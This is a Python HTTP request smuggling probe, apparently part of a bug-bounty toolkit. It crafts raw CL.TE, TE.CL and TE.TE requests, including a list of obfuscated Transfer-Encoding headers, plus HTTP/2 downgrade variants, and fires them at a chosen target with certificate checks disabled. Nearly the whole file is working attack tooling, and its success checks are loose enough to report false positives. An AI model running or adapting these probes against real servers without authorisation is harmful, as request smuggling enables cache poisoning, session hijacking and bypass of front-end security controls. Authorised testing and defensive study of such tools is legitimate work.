#!/usr/bin/env python3
"""
HTTP Request Smuggling Probe — tests CL.TE, TE.CL, TE.TE, H2.CL, H2.TE variants.
Uses Python sockets for precise HTTP/1.1 control and h2 library for HTTP/2 framing.
"""
import argparse
import json
import sys
import os
import time
import socket
import ssl
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed


def te_cl_body_template(nonce, host):
    smuggled = (
        f"GET /smuggled_test_{nonce} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 5\r\n"
        f"\r\n"
        f"x=1\r\n"
    )
    return f"{hex(len(smuggled) + 5)[2:]}\r\n{smuggled}0\r\n\r\n"


SMUGGLING_VARIANTS = {
    "cl-te": {
        "description": "Frontend uses Content-Length, backend uses Transfer-Encoding",
        "headers": "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n",
        "body_template": "0\r\n\r\nG",
        "smuggled_request": "GET /smuggled_test_{nonce} HTTP/1.1\r\nHost: {host}\r\n\r\n",
        "detection_nonce": True,
    },
    "te-cl": {
        "description": "Frontend uses Transfer-Encoding, backend uses Content-Length",
        "headers": "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n",
        "body_template": te_cl_body_template,
        "detection_nonce": True,
    },
    "te-te-obfuscation": {
        "description": "TE.TE with header obfuscation causing parser differential",
        "obfuscations": [
            {"name": "space_before_colon", "te_header": "Transfer-Encoding : chunked\r\n"},
            {"name": "tab_separator", "te_header": "Transfer-Encoding:\tchunked\r\n"},
            {"name": "xchunked", "te_header": "Transfer-Encoding: xchunked\r\n"},
            {"name": "newline_crlf", "te_header": "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n"},
            {"name": "double_te", "te_header": "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n"},
            {"name": "newline_bad", "te_header": "Transfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n"},
            {"name": "leading_space", "te_header": "Transfer-Encoding:  chunked\r\n"},
            {"name": "identity_then_chunked", "te_header": "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked\r\n"},
            {"name": "lowercase_key", "te_header": "transfer-encoding: chunked\r\n"},
            {"name": "mixed_case", "te_header": "Transfer-Encoding: ChuNkEd\r\n"},
        ],
        "detection_nonce": True,
    },
    "h2-cl": {
        "description": "HTTP/2 frontend → HTTP/1.1 backend: H2 drops CL, backend uses it",
        "header_injection": "Content-Length: 0",
        "target_prefix": None,
        "detection_nonce": False,
    },
    "h2-te": {
        "description": "HTTP/2 frontend → HTTP/1.1 backend: H2 injects TE header",
        "header_injection": "Transfer-Encoding: chunked",
        "target_prefix": "0\r\n\r\n",
        "detection_nonce": False,
    },
}


def load_context(context_path):
    if not context_path or not os.path.exists(context_path):
        return {}
    try:
        with open(context_path) as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[warn] Failed to load context: {e}", file=sys.stderr)
        return {}


def load_headers_file(path):
    variants = []
    if not path or not os.path.exists(path):
        return variants
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                if ":" in line:
                    key, val = line.split(":", 1)
                    variants.append({"name": line.strip(), "te_header": f"{key.strip()}: {val.strip()}\r\n"})
    return variants


def parse_target(target):
    if "://" not in target:
        target = f"https://{target}"
    host = target.split("://")[1].split("/")[0].split(":")[0]
    port = 443
    if ":" in target.split("://")[1].split("/")[0]:
        port = int(target.split("://")[1].split("/")[0].split(":")[1])
    return host, port


def do_smuggling_probe(host, port, request_bytes, timeout=10, tls=True):
    findings = []
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)

        sock.settimeout(timeout)
        sock.sendall(request_bytes)
        time.sleep(1.5)

        try:
            fragment = sock.recv(4096)
        except socket.timeout:
            fragment = b""

        clean = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()
        sock.sendall(clean)
        time.sleep(0.5)

        response_data = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
            except socket.timeout:
                break
        sock.close()

        response_text = response_data.decode(errors="replace")
        return {"response": response_text, "error": None}
    except socket.timeout:
        return {"response": "", "error": "timeout"}
    except ConnectionRefusedError:
        return {"response": "", "error": "connection_refused"}
    except Exception as e:
        return {"response": "", "error": str(e)}


def test_cl_te(host, port, tls, timeout):
    nonce = uuid.uuid4().hex[:12]
    smuggled = f"GET /smuggled_{nonce} HTTP/1.1\r\nHost: {host}\r\n\r\n"
    body = f"0\r\n\r\n{smuggled}"
    request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{body}"
    ).encode()

    result = do_smuggling_probe(host, port, request, timeout, tls)
    response = result["response"]
    finding = {
        "smuggling_type": "CL.TE",
        "frontend_parser": "Content-Length",
        "backend_parser": "Transfer-Encoding",
        "success": False,
        "evidence": None,
        "time_differential": 0.0,
        "error": result["error"],
    }

    if not result["error"] and response:
        status_lines = [l for l in response.split("\r\n") if l.startswith("HTTP/")]
        if len(status_lines) >= 2:
            first_status = status_lines[0]
            second_status = status_lines[1] if len(status_lines) > 1 else ""
            if "404" in second_status or f"smuggled_{nonce}" in response:
                finding["success"] = True
                finding["evidence"] = response[:500]
            elif "404" in first_status:
                finding["success"] = True
                finding["evidence"] = response[:500]

    return finding


def test_te_cl(host, port, tls, timeout):
    nonce = uuid.uuid4().hex[:12]
    smuggled = f"GET /smuggled_{nonce} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 5\r\n\r\n0\r\n\r\n"
    smuggled_hex_len = hex(len(smuggled))[2:]
    body = f"{smuggled_hex_len}\r\n{smuggled}0\r\n\r\n"
    request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: 4\r\n"
        f"\r\n"
        f"{body}"
    ).encode()

    result = do_smuggling_probe(host, port, request, timeout, tls)
    response = result["response"]
    finding = {
        "smuggling_type": "TE.CL",
        "frontend_parser": "Transfer-Encoding",
        "backend_parser": "Content-Length",
        "success": False,
        "evidence": None,
        "time_differential": 0.0,
        "error": result["error"],
    }

    if not result["error"] and response:
        if f"smuggled_{nonce}" in response or ("404" in response):
            finding["success"] = True
            finding["evidence"] = response[:500]

    return finding


def test_te_te_obfuscation(host, port, obfuscations, tls, timeout):
    findings = []
    nonce = uuid.uuid4().hex[:12]
    smuggled = f"GET /smuggled_{nonce} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 5\r\n\r\n0\r\n\r\n"

    for obf in obfuscations:
        te_hdr = obf["te_header"]
        body = f"4\r\ntest0\r\n\r\n"
        request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {len(body.encode())}\r\n"
            f"{te_hdr}"
            f"\r\n"
            f"{body}"
        ).encode()

        start = time.time()
        result = do_smuggling_probe(host, port, request, timeout, tls)
        elapsed = time.time() - start

        finding = {
            "smuggling_type": "TE.TE",
            "obfuscation": obf["name"],
            "te_header": obf["te_header"].strip(),
            "success": False,
            "evidence": None,
            "time_differential": elapsed,
            "error": result["error"],
        }

        if not result["error"] and result["response"]:
            resp = result["response"]
            if "400" not in resp[:30] and "411" not in resp[:30] and "501" not in resp[:30]:
                if len(resp) > 50:
                    finding["success"] = True
                    finding["evidence"] = f"Response accepted (len={len(resp)}), status={resp.split(chr(13))[0] if resp else 'empty'}"

        findings.append(finding)
        if finding["success"]:
            print(f"  [!] TE.TE obfuscation '{obf['name']}' accepted by server", file=sys.stderr)
        else:
            print(f"  [-] {obf['name']}: blocked or rejected", file=sys.stderr)

    return findings


def test_h2_smuggling(host, port, tls, timeout, mode="h2-cl"):
    finding = {
        "smuggling_type": mode.upper().replace("-", "."),
        "frontend_parser": "HTTP/2",
        "backend_parser": "HTTP/1.1",
        "success": False,
        "evidence": None,
        "time_differential": 0.0,
        "error": None,
    }

    try:
        import http.client
        conn = http.client.HTTPSConnection(host, port, timeout=timeout)
        injected_headers = {}
        if mode == "h2-cl":
            injected_headers["Content-Length"] = "0"
        elif mode == "h2-te":
            injected_headers["Transfer-Encoding"] = "chunked"
            injected_headers["X-HTTP2-Test"] = "1"

        start = time.time()
        conn.request("GET", "/", headers={
            "Host": host,
            "User-Agent": "H2SmugglingProbe/2.0",
            **injected_headers,
        })
        resp = conn.getresponse()
        elapsed = time.time() - start
        body = resp.read().decode(errors="replace")

        finding["time_differential"] = elapsed
        finding["status_code"] = resp.status
        finding["response_length"] = len(body)

        if elapsed > 8.0:
            finding["success"] = True
            finding["evidence"] = f"Request hung for {elapsed:.1f}s — possible {mode.upper()} smuggling (backend consumed injected body)"
        elif resp.status >= 400:
            finding["success"] = True
            finding["evidence"] = f"Status {resp.status} with injected {mode} headers — possible downgrade response"

    except Exception as e:
        finding["error"] = str(e)

    return finding


def test_h2_smuggling_socket(host, port, timeout):
    finding = {
        "smuggling_type": "H2.CL",
        "frontend_parser": "HTTP/2",
        "backend_parser": "HTTP/1.1 (via downgrade)",
        "success": False,
        "evidence": None,
        "time_differential": 0.0,
        "error": None,
    }

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])

        sock = socket.create_connection((host, port), timeout=timeout)
        ss = ctx.wrap_socket(sock, server_hostname=host)

        negotiated = ss.selected_alpn_protocol()
        if not negotiated or "h2" not in negotiated:
            finding["error"] = f"HTTP/2 not negotiated (got: {negotiated})"
            ss.close()
            return finding

        magic = b"\x00\x00\x24\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        ss.sendall(magic)
        time.sleep(0.5)

        h1_request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 0\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        start = time.time()
        ss.sendall(h1_request)
        try:
            data = ss.recv(4096)
        except socket.timeout:
            data = b""
        elapsed = time.time() - start

        finding["time_differential"] = elapsed
        response_text = data.decode(errors="replace")
        if "HTTP/1.1" in response_text and elapsed > 2:
            finding["success"] = True
            finding["evidence"] = response_text[:300]

        ss.close()
    except Exception as e:
        finding["error"] = str(e)

    return finding


def main():
    parser = argparse.ArgumentParser(
        description="HTTP Request Smuggling Probe — CL.TE, TE.CL, TE.TE, H2.CL, H2.TE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target https://target.com --mode all --context .bb/context.json
  %(prog)s --target target.com --mode cl-te --output clte.jsonl --dry-run
  %(prog)s --target https://target.com --mode te-te --headers-file payloads/smuggling-headers.txt
        """,
    )
    parser.add_argument("--context", default=None, help="Path to context.json")
    parser.add_argument("--target", required=True, help="Target URL (https://host or host)")
    parser.add_argument("--mode", default="all", choices=["all", "cl-te", "te-cl", "te-te", "h2-cl", "h2-te", "h2", "http1"], help="Smuggling mode to test")
    parser.add_argument("--output", default=None, help="Output findings.jsonl path")
    parser.add_argument("--timeout", type=int, default=15, help="Socket timeout in seconds")
    parser.add_argument("--dry-run", action="store_true", help="Print planned tests without executing")
    parser.add_argument("--headers-file", default=None, help="File with additional TE obfuscation variants")
    parser.add_argument("--no-tls", action="store_true", help="Connect via plain HTTP (port 80)")
    args = parser.parse_args()

    ctx = load_context(args.context)
    outdir = ctx.get("outdir", os.getcwd())
    evidence_dir = ctx.get("evidence_dir", os.path.join(outdir, "evidence"))
    os.makedirs(outdir, exist_ok=True)
    os.makedirs(evidence_dir, exist_ok=True)

    output_path = args.output
    if not output_path:
        output_path = os.path.join(outdir, "http_smuggling_findings.jsonl")

    host, port = parse_target(args.target)
    use_tls = not args.no_tls

    print(f"[info] Target: {host}:{port} (TLS={use_tls})  Mode={args.mode}", file=sys.stderr)

    if args.dry_run:
        print("[dry-run] Would probe CL.TE, TE.CL, TE.TE, H2.CL, H2.TE", file=sys.stderr)
        print(f"[dry-run] Output would go to: {output_path}", file=sys.stderr)
        return

    all_findings = []
    modes = (
        ["cl-te", "te-cl", "te-te", "h2-cl", "h2-te"]
        if args.mode == "all"
        else (["cl-te", "te-cl", "te-te"] if args.mode == "http1" else (["h2-cl", "h2-te"] if args.mode == "h2" else [args.mode]))
    )

    if "cl-te" in modes:
        print("[*] Testing CL.TE smuggling...", file=sys.stderr)
        finding = test_cl_te(host, port, use_tls, args.timeout)
        all_findings.append(finding)
        status = "FOUND" if finding["success"] else "none"
        print(f"  [{status}] CL.TE: frontend=CL backend=TE success={finding['success']}", file=sys.stderr)

    if "te-cl" in modes:
        print("[*] Testing TE.CL smuggling...", file=sys.stderr)
        finding = test_te_cl(host, port, use_tls, args.timeout)
        all_findings.append(finding)
        status = "FOUND" if finding["success"] else "none"
        print(f"  [{status}] TE.CL: frontend=TE backend=CL success={finding['success']}", file=sys.stderr)

    if "te-te" in modes:
        print("[*] Testing TE.TE obfuscation smuggling...", file=sys.stderr)
        obfs = SMUGGLING_VARIANTS["te-te-obfuscation"]["obfuscations"]
        if args.headers_file:
            extra = load_headers_file(args.headers_file)
            if extra:
                obfs = obfs + [{"name": f"file_{e['name']}", "te_header": e["te_header"]} for e in extra]
        findings = test_te_te_obfuscation(host, port, obfs, use_tls, args.timeout)
        all_findings.extend(findings)
        successes = sum(1 for f in findings if f["success"])
        print(f"  TE.TE: {successes}/{len(findings)} obfuscations accepted", file=sys.stderr)

    if "h2-cl" in modes or "h2-te" in modes:
        print("[*] Testing HTTP/2 downgrade smuggling...", file=sys.stderr)

        for hmode in ["h2-cl", "h2-te"]:
            if hmode in modes:
                try:
                    finding = test_h2_smuggling(host, port, use_tls, args.timeout, mode=hmode)
                    all_findings.append(finding)
                    status = "FOUND" if finding["success"] else "none"
                    print(f"  [{status}] {hmode.upper()}: success={finding['success']} time={finding.get('time_differential', 0):.1f}s", file=sys.stderr)
                except Exception as e:
                    print(f"  [err] {hmode}: {e}", file=sys.stderr)

        try:
            raw_http2 = test_h2_smuggling_socket(host, port, args.timeout)
            if raw_http2["success"]:
                all_findings.append(raw_http2)
                print(f"  [FOUND] H2 socket test: smuggling confirmed", file=sys.stderr)
        except Exception as e:
            print(f"  [info] Raw H2 socket test skipped: {e}", file=sys.stderr)

    with open(output_path, "w") as outfile:
        for finding in all_findings:
            outfile.write(json.dumps(finding) + "\n")

    confirmed = sum(1 for f in all_findings if f.get("success"))
    print(f"\n[done] {confirmed}/{len(all_findings)} modes confirmed smuggling", file=sys.stderr)
    print(f"[done] Findings written to {output_path}", file=sys.stderr)

    summary = {
        "total_tests": len(all_findings),
        "smuggling_confirmed": confirmed,
        "target": f"{host}:{port}",
        "output_path": output_path,
    }
    print(json.dumps(summary, indent=2), file=sys.stderr)


if __name__ == "__main__":
    main()